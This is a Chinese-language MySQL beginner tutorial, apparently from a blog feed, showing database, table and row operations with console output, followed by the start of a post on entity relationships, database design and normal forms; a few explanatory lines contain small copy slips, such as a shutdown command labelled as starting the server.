<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| test               |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>注意：数据库安装后，只带上面四个数据库</p>
<h4 id="1-5-3-删除数据库"><a href="#1-5-3-删除数据库" class="headerlink" title="1.5.3   删除数据库"></a>1.5.3   删除数据库</h4><p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop database [if exists] 数据库名</span><br></pre></td></tr></table></figure>

<p>例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; drop database `create`;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; drop database `%$`;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">-- 判断数据库是否存在，如果存在就删除</span><br><span class="line">mysql&gt; drop database if exists stu;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>小结：<br>1、如果删除的数据库不存在，会报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解决：删除之前判断一下，如果存在就删除</span><br></pre></td></tr></table></figure>



<h4 id="1-5-4-显示创建数据库的语句"><a href="#1-5-4-显示创建数据库的语句" class="headerlink" title="1.5.4 显示创建数据库的语句"></a>1.5.4 显示创建数据库的语句</h4><p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show create database 数据库名</span><br></pre></td></tr></table></figure>

<p>例题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show create database emp;</span><br><span class="line">+----------+-------------------------------------------------------------+</span><br><span class="line">| Database | Create Database                                             |</span><br><span class="line">+----------+-------------------------------------------------------------+</span><br><span class="line">| emp      | CREATE DATABASE `emp` /*!40100 DEFAULT CHARACTER SET gbk */ |</span><br><span class="line">+----------+-------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<h4 id="1-5-5-修改数据库"><a href="#1-5-5-修改数据库" class="headerlink" title="1.5.5  修改数据库"></a>1.5.5  修改数据库</h4><p>只能修改数据库选项，数据库的选项只有字符编码</p>
<p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter database 数据库名 charset=字符编码</span><br></pre></td></tr></table></figure>

<p>例题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; alter database emp charset=utf8;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<p>1、修改数据库只能修改数据库的字符编码</p>
<p>2、在MySQL中utf字符编码之间没有横杆    utf8</p>
<h4 id="1-5-6-选择数据库"><a href="#1-5-6-选择数据库" class="headerlink" title="1.5.6  选择数据库"></a>1.5.6  选择数据库</h4><p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 数据库名</span><br></pre></td></tr></table></figure>

<p>例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; use emp;</span><br><span class="line">Database changed</span><br></pre></td></tr></table></figure>



<h2 id="1-6-表的操作"><a href="#1-6-表的操作" class="headerlink" title="1.6  表的操作"></a>1.6  表的操作</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create database data;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use data;</span><br><span class="line">Database changed</span><br></pre></td></tr></table></figure>



<h4 id="1-6-1-创建表"><a href="#1-6-1-创建表" class="headerlink" title="1.6.1  创建表"></a>1.6.1  创建表</h4><p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table [if not exists] `表名`(</span><br><span class="line">    `字段名` 数据类型 [null|not null] [default] [auto_increment] [primary key] [comment],</span><br><span class="line">    `字段名 数据类型 …</span><br><span class="line">)[engine=存储引擎] [charset=字符编码]</span><br><span class="line"></span><br><span class="line">null|not null     是否为空</span><br><span class="line">default:          默认值</span><br><span class="line">auto_increment    自动增长,默认从1开始，每次递增1</span><br><span class="line">primary key       主键，主键的值不能重复，不能为空,每个表必须只能有一个主键</span><br><span class="line">comment:          备注</span><br><span class="line">engine            引擎决定了数据的存储和查找   myisam、innodb</span><br><span class="line"></span><br><span class="line">脚下留心：表名和字段名如果用了关键字，要用反引号引起来。</span><br></pre></td></tr></table></figure>

<p>例题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> -- 设置客户端和服务器通讯的编码</span><br><span class="line">mysql&gt; set names gbk;  </span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 创建简单的表</span><br><span class="line">mysql&gt; create table stu1(</span><br><span class="line">    -&gt; id int auto_increment primary key,</span><br><span class="line">    -&gt; name varchar(20) not null</span><br><span class="line">    -&gt; )engine=innodb charset=gbk;</span><br><span class="line">Query OK, 0 rows affected (0.11 sec)</span><br><span class="line"></span><br><span class="line">-- 创建复杂的表</span><br><span class="line">mysql&gt; create table stu2(</span><br><span class="line">    -&gt; id int auto_increment primary key comment &#x27;主键&#x27;,</span><br><span class="line">    -&gt; name varchar(20) not null comment &#x27;姓名&#x27;,</span><br><span class="line">    -&gt; `add` varchar(50) not null default &#x27;地址不详&#x27; comment &#x27;地址&#x27;,</span><br><span class="line">    -&gt; score int comment &#x27;成绩,可以为空&#x27;</span><br><span class="line">    -&gt; )engine=myisam;</span><br><span class="line">Query OK, 0 rows affected (0.06 sec)</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<p>1、如果不指定引擎，默认是innodb</p>
<p>2、如果不指定字符编码，默认和数据库编码一致</p>
<p>3、varchar(20) 表示长度是20个字符</p>
<p>数据表的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个数据库对应一个文件夹</span><br><span class="line">一个表对应一个或多个文件</span><br><span class="line">引擎是myisam，一个表对应三个文件</span><br><span class="line">	.frm	：存储的是表结构</span><br><span class="line">	.myd	:存储的是表数据</span><br><span class="line">	.myi	:存储的表数据的索引</span><br><span class="line">引擎是innodb,一个表对应一个表结构文件，innodb的都有表的数据都保存在ibdata1文件中，如果数据量很大，会自动的创建ibdata2，ibdata3...</span><br></pre></td></tr></table></figure>

<p>innodb和myisam的区别</p>
<table>
<thead>
<tr>
<th>引擎</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>myisam</td>
<td>1、查询速度快<br />2、容易产生碎片<br />3、不能约束数据</td>
</tr>
<tr>
<td>innodb</td>
<td>1、以前没有myisam查询速度快，现在已经提速了<br />2、不产生碎片<br />3、可以约束数据</td>
</tr>
</tbody></table>
<p>脚下留心：推荐使用innodb。</p>
<h4 id="1-6-2-显示所有表"><a href="#1-6-2-显示所有表" class="headerlink" title="1.6.2  显示所有表"></a>1.6.2  显示所有表</h4><p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></figure>

<p>例题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>



<h4 id="1-6-3-显示创建表的语句"><a href="#1-6-3-显示创建表的语句" class="headerlink" title="1.6.3   显示创建表的语句"></a>1.6.3   显示创建表的语句</h4><p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show create table;	 -- 结果横着排列</span><br><span class="line">show create table \G  -- 将结果竖着排列</span><br></pre></td></tr></table></figure>



<h4 id="1-6-4-查看表结构"><a href="#1-6-4-查看表结构" class="headerlink" title="1.6.4  查看表结构"></a>1.6.4  查看表结构</h4><p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">desc[ribe] 表名</span><br></pre></td></tr></table></figure>

<p>例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 方法一</span><br><span class="line">mysql&gt; describe stu2;</span><br><span class="line">+-------+-------------+------+-----+----------+----------------+</span><br><span class="line">| Field | Type        | Null | Key | Default  | Extra          |</span><br><span class="line">+-------+-------------+------+-----+----------+----------------+</span><br><span class="line">| id    | int(11)     | NO   | PRI | NULL     | auto_increment |</span><br><span class="line">| name  | varchar(20) | NO   |     | NULL     |                |</span><br><span class="line">| add   | varchar(50) | NO   |     | 地址不详        |                |</span><br><span class="line">| score | int(11)     | YES  |     | NULL     |                |</span><br><span class="line">+-------+-------------+------+-----+----------+----------------+</span><br><span class="line">4 rows in set (0.05 sec)</span><br><span class="line"></span><br><span class="line">-- 方法二</span><br><span class="line">mysql&gt; desc stu2;</span><br><span class="line">+-------+-------------+------+-----+----------+----------------+</span><br><span class="line">| Field | Type        | Null | Key | Default  | Extra          |</span><br><span class="line">+-------+-------------+------+-----+----------+----------------+</span><br><span class="line">| id    | int(11)     | NO   | PRI | NULL     | auto_increment |</span><br><span class="line">| name  | varchar(20) | NO   |     | NULL     |                |</span><br><span class="line">| add   | varchar(50) | NO   |     | 地址不详        |                |</span><br><span class="line">| score | int(11)     | YES  |     | NULL     |                |</span><br><span class="line">+-------+-------------+------+-----+----------+----------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<h4 id="1-6-5-复制表"><a href="#1-6-5-复制表" class="headerlink" title="1.6.5  复制表"></a>1.6.5  复制表</h4><p><strong>语法一：</strong>create table 新表 select 字段 from 旧表</p>
<p>特点：不能复制父表的键，能够复制父表的数据</p>
<p><strong>语法二：</strong>create table 新表 like 旧表</p>
<p>特点：只能复制表结构，不能复制表数据</p>
<p>小结：</p>
<p>*表示所有字段</p>
<h4 id="1-6-6-删除表"><a href="#1-6-6-删除表" class="headerlink" title="1.6.6  删除表"></a>1.6.6  删除表</h4><p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop table [if exists] 表1，表2,… </span><br></pre></td></tr></table></figure>

<p>例题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 删除表</span><br><span class="line">mysql&gt; drop table stu4;</span><br><span class="line">Query OK, 0 rows affected (0.06 sec)</span><br><span class="line"></span><br><span class="line">-- 如果表存在就删除</span><br><span class="line">mysql&gt; drop table if exists stu4;</span><br><span class="line">Query OK, 0 rows affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 一次删除多个表</span><br><span class="line">mysql&gt; drop table stu2,stu3;</span><br><span class="line">Query OK, 0 rows affected (0.03 sec)</span><br></pre></td></tr></table></figure>



<h4 id="1-6-7-修改表"><a href="#1-6-7-修改表" class="headerlink" title="1.6.7  修改表"></a>1.6.7  修改表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法：alter table 表名 </span><br></pre></td></tr></table></figure>

<p>创建初始表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table stu(</span><br><span class="line">    -&gt; id int,</span><br><span class="line">    -&gt; name varchar(20)</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>1、添加字段：alter table 表名add [column] 字段名 数据类型 [位置] </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; alter table stu add `add` varchar(20);	-- 默认添加字段放在最后</span><br><span class="line">Query OK, 0 rows affected (0.05 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; alter table stu add sex char(1) after name;  -- 在name之后添加sex字段</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; alter table stu add age int first;  -- age放在最前面</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; desc stu;</span><br><span class="line">+-------+-------------+------+-----+---------+-------+</span><br><span class="line">| Field | Type        | Null | Key | Default | Extra |</span><br><span class="line">+-------+-------------+------+-----+---------+-------+</span><br><span class="line">| age   | int(11)     | YES  |     | NULL    |       |</span><br><span class="line">| id    | int(11)     | YES  |     | NULL    |       |</span><br><span class="line">| name  | varchar(20) | YES  |     | NULL    |       |</span><br><span class="line">| sex   | char(1)     | YES  |     | NULL    |       |</span><br><span class="line">| add   | varchar(20) | YES  |     | NULL    |       |</span><br><span class="line">+-------+-------------+------+-----+---------+-------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>2、删除字段：alter table 表 drop [column] 字段名   </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; alter table stu drop age;   -- 删除age字段</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br></pre></td></tr></table></figure>



<p>3、修改字段(改名)：alter table 表 change [column] 原字段名 新字段名 数据类型 …    </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 将name字段更改为stuname varchar(10)</span><br><span class="line">mysql&gt; alter table stu change name stuname varchar(10);</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; desc stu;</span><br><span class="line">+---------+-------------+------+-----+---------+-------+</span><br><span class="line">| Field   | Type        | Null | Key | Default | Extra |</span><br><span class="line">+---------+-------------+------+-----+---------+-------+</span><br><span class="line">| id      | int(11)     | YES  |     | NULL    |       |</span><br><span class="line">| stuname | varchar(10) | YES  |     | NULL    |       |</span><br><span class="line">| sex     | char(1)     | YES  |     | NULL    |       |</span><br><span class="line">| add     | varchar(20) | YES  |     | NULL    |       |</span><br><span class="line">+---------+-------------+------+-----+---------+-------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>4、修改字段（不改名）:alter table 表 modify 字段名 字段属性…   </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 将sex数据类型更改为varchar(20)</span><br><span class="line">mysql&gt; alter table stu  modify sex varchar(20);</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">-- 将add字段更改为varchar(20) 默认值是‘地址不详’</span><br><span class="line">mysql&gt; alter table stu modify `add` varchar(20) default &#x27;地址不详&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br></pre></td></tr></table></figure>



<p>5、修改引擎：alter table 表名 engine&#x3D;引擎名   </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; alter table stu engine=myisam;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br></pre></td></tr></table></figure>



<p>6、修改表名:alter table 表名 rename to 新表名    </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 将stu表名改成student</span><br><span class="line">mysql&gt; alter table stu rename to student;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>7、将表移动到其他数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 将当前数据库中的student表移动到php74数据库中改名为stu</span><br><span class="line">mysql&gt; alter table student rename to php74.stu;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>



<h2 id="1-7-数据操作"><a href="#1-7-数据操作" class="headerlink" title="1.7  数据操作"></a>1.7  数据操作</h2><h4 id="1-7-1-插入数据"><a href="#1-7-1-插入数据" class="headerlink" title="1.7.1  插入数据"></a>1.7.1  插入数据</h4><p>语法：insert into 表名 (字段名, 字段名,…) values (值1, 值1,…)</p>
<p>1、插入所有字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 插入所有字段</span><br><span class="line">mysql&gt; insert into stu (id,stuname,sex,`add`) values (1,&#x27;tom&#x27;,&#x27;男&#x27;,&#x27;北京&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 插入部分字段</span><br><span class="line">mysql&gt; insert into stu(id,stuname) values (2,&#x27;berry&#x27;);</span><br><span class="line"></span><br><span class="line">-- 插入的字段和表的字段可以顺序不一致。但是插入字段名和插入的值一定要一一对应</span><br><span class="line">mysql&gt; insert into stu(sex,`add`,id,stuname) values (&#x27;女&#x27;,&#x27;上海&#x27;,3,&#x27;ketty&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 插入字段名可以省略</span><br><span class="line">mysql&gt; insert into stu values(4,&#x27;rose&#x27;,&#x27;女&#x27;,&#x27;重庆&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、插入字段名的顺序和数据表中字段名的顺序可以不一致</span><br><span class="line">2、插入值的个数、顺序必须和插入字段名的个数、顺序要一致。</span><br><span class="line">3、如果插入的值的顺序和个数与表字段的顺序个数一致，插入字段可以省略。</span><br></pre></td></tr></table></figure>



<p>2、插入默认值和空值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; insert into stu values (5,&#x27;jake&#x27;,null,default);</span><br><span class="line">Query OK, 1 row affected (0.05 sec)</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">default关键字用来插入默认值，null用来插入空值.</span><br></pre></td></tr></table></figure>



<p>3、插入多条数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; insert into stu values (6,&#x27;李白&#x27;,&#x27;男&#x27;,&#x27;四川&#x27;),(7,&#x27;杜甫&#x27;,&#x27;男&#x27;,&#x27;湖北&#x27;);</span><br><span class="line">Query OK, 2 rows affected (0.00 sec)</span><br><span class="line">Records: 2  Duplicates: 0  Warnings: 0</span><br></pre></td></tr></table></figure>



<h4 id="1-7-2-更新数据"><a href="#1-7-2-更新数据" class="headerlink" title="1.7.2  更新数据"></a>1.7.2  更新数据</h4><p>语法：update 表名 set 字段&#x3D;值 [where 条件] </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 将berry性别改为女</span><br><span class="line">mysql&gt; update stu set sex=&#x27;女&#x27; where stuname=&#x27;berry&#x27;;</span><br><span class="line">Query OK, 1 row affected (0.06 sec)</span><br><span class="line"></span><br><span class="line">-- 将编号是1号的学生性别改成女，地址改为上海。</span><br><span class="line">mysql&gt; update stu set sex=&#x27;女&#x27;,`add`=&#x27;上海&#x27; where id=1;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>



<h4 id="1-7-3-删除数据"><a href="#1-7-3-删除数据" class="headerlink" title="1.7.3  删除数据"></a>1.7.3  删除数据</h4><p>语法：delete from 表名 [where 条件] </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 删除1号学生</span><br><span class="line">mysql&gt; delete from stu where id=1;</span><br><span class="line"></span><br><span class="line">-- 删除名字是berry的学生</span><br><span class="line">mysql&gt; delete from stu where stuname=&#x27;berry&#x27;;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 删除所有数据</span><br><span class="line">mysql&gt; delete from stu;</span><br><span class="line">Query OK, 5 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>多学一招：delete from 表和truncate table 表区别？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、delete from 表：遍历表记录，一条一条的删除</span><br><span class="line">2、truncate table：将原表销毁，再创建一个同结构的新表。就清空表而言，这种方法效率高。</span><br></pre></td></tr></table></figure>



<h4 id="1-7-4-查询数据"><a href="#1-7-4-查询数据" class="headerlink" title="1.7.4  查询数据"></a>1.7.4  查询数据</h4><p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 列名 from 表名</span><br></pre></td></tr></table></figure>

<p>例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 查询id字段的值</span><br><span class="line">mysql&gt; select id from stu;</span><br><span class="line"></span><br><span class="line">-- 查询id,stuname字段的值</span><br><span class="line">mysql&gt; select id,stuname from stu;、</span><br><span class="line"></span><br><span class="line">-- 查询所有字段的值</span><br><span class="line">mysql&gt; select * from stu;</span><br></pre></td></tr></table></figure>



<h4 id="1-7-5-数据传输时使用字符集"><a href="#1-7-5-数据传输时使用字符集" class="headerlink" title="1.7.5  数据传输时使用字符集"></a>1.7.5  数据传输时使用字符集</h4><p>发现：在插入数据的时候，如果有中文会报错（或者中文无法插入）</p>
<p>分析：</p>
<p>1、查看客户端发送的编码</p>
<p>2、查看服务器接受，返回的编码</p>
<p>更改接受客户端指令的编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; set character_set_client=gbk;</span><br><span class="line">Query OK, 0 rows affected (0.05 sec)</span><br></pre></td></tr></table></figure>



<p>原因：返回编码是utf8，客户端是gbk;</p>
<p>测试：成功</p>
<p>可以通过set names一次性设置</p>
<p>小结：</p>
<p>1、设置什么编码取决于客户端的编码</p>
<p>2、通过set names 设置编码</p>
<h2 id="1-8-补充知识"><a href="#1-8-补充知识" class="headerlink" title="1.8  补充知识"></a>1.8  补充知识</h2><p>每次执行指令要进入相应的目录中，麻烦，可以通过环境变量简化操作。</p>
<h4 id="1-8-1-环境变量配置"><a href="#1-8-1-环境变量配置" class="headerlink" title="1.8.1  环境变量配置"></a>1.8.1  环境变量配置</h4><p>我的电脑右键——属性——高级</p>
<p>将mysql指令目录地址添加到环境变量的Path值中</p>
<p>这时候就可以在任意目录下使用mysql指令</p>
<p>原理：</p>
<p>1、输入指令后，首先在当前目录下查找，如果当前目录下找不到，就到环境变量的Path中查找</p>
<p>2、Path中有很多目录，从前往后查找</p>
<p>1.8.2修改密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进入MySQL命令行界面后，使用以下命令更改MySQL用户的密码：</span><br><span class="line"> set password = password(&#x27;root123&#x27;);</span><br><span class="line"></span><br><span class="line">其中，user是要更改密码的MySQL用户的用户名，</span><br><span class="line">localhost是该用户的主机名（也可以是IP地址或通配符%）</span><br><span class="line">new_password是新的密码。如果要更改当前登录用户的密码，</span><br><span class="line">可以将user和localhost替换为CURRENT_USER()。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.8.3mysql手动启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在命令提示符或 PowerShell 窗口中输入以下命令启动 MySQL 服务：</span><br><span class="line">mysqld --console</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在命令提示符或 PowerShell 窗口中输入以下命令启动 MySQL 服务：</span><br><span class="line">mysqladmin -uroot -p shutdown</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>MYSQL数据库基础3</title>
    <url>/2023/04/23/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%803/</url>
    <content><![CDATA[<h2 id="1-2-实体之间的关系"><a href="#1-2-实体之间的关系" class="headerlink" title="1.2  实体之间的关系"></a>1.2  实体之间的关系</h2><h4 id="1-2-1-一对多（1：N）"><a href="#1-2-1-一对多（1：N）" class="headerlink" title="1.2.1  一对多（1：N）"></a>1.2.1  一对多（1：N）</h4><p> 主表中的一条记录对应从表中的多条记录</p>
<p>实现一对多的方式：主键和非主键建关系</p>
<p>问题：说出几个一对多的关系？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">班主任表——学生表</span><br><span class="line">品牌表——商品表</span><br></pre></td></tr></table></figure>



<h4 id="1-2-2-多对一（N：1）"><a href="#1-2-2-多对一（N：1）" class="headerlink" title="1.2.2  多对一（N：1）"></a>1.2.2  多对一（N：1）</h4><p>多对一就是一对多</p>
<h4 id="1-2-3-一对一（1-1）"><a href="#1-2-3-一对一（1-1）" class="headerlink" title="1.2.3  一对一（1:1）"></a>1.2.3  一对一（1:1）</h4><p>如何实现一对一：主键和主键建关系</p>
<p>思考：一对一两个表完全可以用一个表实现，为什么还要分成两个表？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">答：在字段数量很多情况下，数据量也就很大，每次查询都需要检索大量数据，这样效率低下。我们可以将所有字段分成两个部分，“常用字段”和“不常用字段”，这样对大部分查询者来说效率提高了。【表的垂直分割】</span><br></pre></td></tr></table></figure>



<h4 id="1-2-3-多对多（N：M）"><a href="#1-2-3-多对多（N：M）" class="headerlink" title="1.2.3  多对多（N：M）"></a>1.2.3  多对多（N：M）</h4><p>主表中的一条记录对应从表中的多条记录，从表中的一条记录，对应主表中的多条记录</p>
<p>如何实现多对多：利用第三张关系表</p>
<p>问题：说出几个多对多的关系？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">讲师表——学生表</span><br><span class="line">课程表——学生表</span><br><span class="line">商品表——订单表</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如何实现一对一：主键和主键建关系</span><br><span class="line">如果实现一对多：主键和非主键建关系</span><br><span class="line">如何实现多对多：引入第三张关系表</span><br></pre></td></tr></table></figure>



<h2 id="1-3-数据库设计"><a href="#1-3-数据库设计" class="headerlink" title="1.3 数据库设计"></a>1.3 数据库设计</h2><h4 id="1-3-1-数据库设计的步骤"><a href="#1-3-1-数据库设计的步骤" class="headerlink" title="1.3.1  数据库设计的步骤"></a>1.3.1  数据库设计的步骤</h4><ol>
<li><p>收集信息：与该系统有关人员进行交流、坐谈，充分理解数据库需要完成的任务</p>
</li>
<li><p>标识对象（实体－Entity）：标识数据库要管理的关键对象或实体 </p>
</li>
<li><p>标识每个实体的属性（Attribute）</p>
</li>
<li><p>标识对象之间的关系（Relationship）</p>
</li>
<li><p>将模型转换成数据库</p>
</li>
<li><p>规范化</p>
</li>
</ol>
<h4 id="1-3-2-例题"><a href="#1-3-2-例题" class="headerlink" title="1.3.2  例题"></a>1.3.2  例题</h4><p>第一步：收集信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BBS论坛的基本功能：</span><br><span class="line">用户注册和登录，后台数据库需要存放用户的注册信息和在线状态信息；</span><br><span class="line">用户发贴，后台数据库需要存放贴子相关信息，如贴子内容、标题等；</span><br><span class="line">用户可以对发帖进行回复；</span><br><span class="line">论坛版块管理：后台数据库需要存放各个版块信息，如版主、版块名称、贴子数等；</span><br></pre></td></tr></table></figure>

<p>第二步：标识对象</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">实体一般是名词：</span><br><span class="line">1、用户对象</span><br><span class="line">2、板块对象</span><br><span class="line">3、帖子对象</span><br><span class="line">4、跟帖对象</span><br></pre></td></tr></table></figure>

<p>第三步：标识每个实体的属性</p>
<p>第四步：标识对象之间的关系</p>
<h4 id="1-3-4-将E-R图转成表"><a href="#1-3-4-将E-R图转成表" class="headerlink" title="1.3.4   将E-R图转成表"></a>1.3.4   将E-R图转成表</h4><ol>
<li>实体转成表，属性转成字段</li>
<li>如果没有合适的字段做主键，给表添加一个自动增长列做主键。</li>
</ol>
<h2 id="1-4-数据规范化"><a href="#1-4-数据规范化" class="headerlink" title="1.4  数据规范化"></a>1.4  数据规范化</h2><h4 id="1-4-1-第一范式：确保每列原则性"><a href="#1-4-1-第一范式：确保每列原则性" class="headerlink" title="1.4.1  第一范式：确保每列原则性"></a>1.4.1  第一范式：确保每列原则性</h4><p>第一范式：的目标是确保每列的原子性，一个字段表示一个含义</p>
<p>思考：地址包含省、市、县、地区是否需要拆分？</p>
<p>答：如果仅仅起地址的作用，不需要统计，可以不拆分；如果有按地区统计的功能需要拆分。</p>
<p>在实际项目中，建议拆分。</p>
<h4 id="1-4-2-第二范式：非键字段必须依赖于键字段"><a href="#1-4-2-第二范式：非键字段必须依赖于键字段" class="headerlink" title="1.4.2  第二范式：非键字段必须依赖于键字段"></a>1.4.2  第二范式：非键字段必须依赖于键字段</h4><p>第二范式：在满足第一范式的前提下，要求每个表只描述一件事情</p>
<h4 id="1-4-3-第三范式：消除传递依赖"><a href="#1-4-3-第三范式：消除传递依赖" class="headerlink" title="1.4.3  第三范式：消除传递依赖"></a>1.4.3  第三范式：消除传递依赖</h4><p>第三范式：在满足第二范式的前提下，除了主键以外的其他列消除传递依赖。</p>
<h4 id="1-4-4-反3NF"><a href="#1-4-4-反3NF" class="headerlink" title="1.4.4  反3NF"></a>1.4.4  反3NF</h4><p>范式越高，数据冗余越少，但是效率有时就越地下，为了提高运行效率，可以适当让数据冗余。</p>
<table>
<thead>
<tr>
<th>学号</th>
<th>姓名</th>
<th>语文</th>
<th>数学</th>
<th>总分</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>李白</td>
<td>77</td>
<td>88</td>
<td>165</td>
</tr>
</tbody></table>
<p>上面的设计不满足第三范式，但是高考分数表就是这样设计的，为什么？</p>
